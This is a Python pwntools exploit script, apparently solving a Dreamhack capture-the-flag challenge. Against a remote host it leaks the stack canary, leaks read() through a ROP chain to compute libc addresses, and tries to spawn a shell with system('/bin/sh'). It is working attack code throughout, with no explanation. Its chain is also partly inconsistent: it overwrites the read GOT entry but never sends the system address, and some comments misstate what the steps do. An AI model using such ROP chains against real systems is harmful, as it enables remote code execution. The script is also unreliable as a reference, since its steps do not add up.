#!/usr/bin/env python3
# Name: rop.py
from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games',9416)
# p = process('./rop', env= {"LD_PRELOAD" : "./libc.so.6"})
e = ELF('./rop')
libc = ELF('./libc.so.6')

# [1] Leak canary
buf = b'A'*0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x0000000000400853
pop_rsi_r15 = 0x0000000000400851
ret = 0x0000000000400854

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8

# Step 1: Leak the read() function's address using write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)  # rdi = 1 (stdout)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)  # rsi = read_got
payload += p64(write_plt)  # write(1, read_got, ...)

# Step 2: Overwrite read_got with the system() function address
payload += p64(pop_rdi) + p64(0)  # rdi = 0 (stdin)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)  # rsi = read_got
payload += p64(read_plt)  # read(0, read_got, ...) to overwrite read_got

# Step 3: Store "/bin/sh" in memory using read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi)
payload += p64(read_got + 0x8)  # Store "/bin/sh" at read_got + 0x8
payload += p64(ret)  # Stack alignment
payload += p64(read_plt)  # read(0, read_got + 0x8, ...) to store /bin/sh

# Send payload to leak the address and overwrite read_got
p.sendafter(b'Buf: ', payload)

# Receive leaked read address and calculate libc base and system() address
read = u64(p.recvn(6) + b'\x00'*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

# Step 4: Send system() address and "/bin/sh" string to stdin
p.send(b'/bin/sh\x00')  # Store "/bin/sh" at the memory location

# Step 5: Now execute system("/bin/sh") with the stored /bin/sh string
payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
payload += p64(pop_rdi) + p64(read_got + 0x8)  # rdi = address of "/bin/sh"
payload += p64(system)  # Call system("/bin/sh")

p.send(payload)

# Interact with the shell
p.interactive()

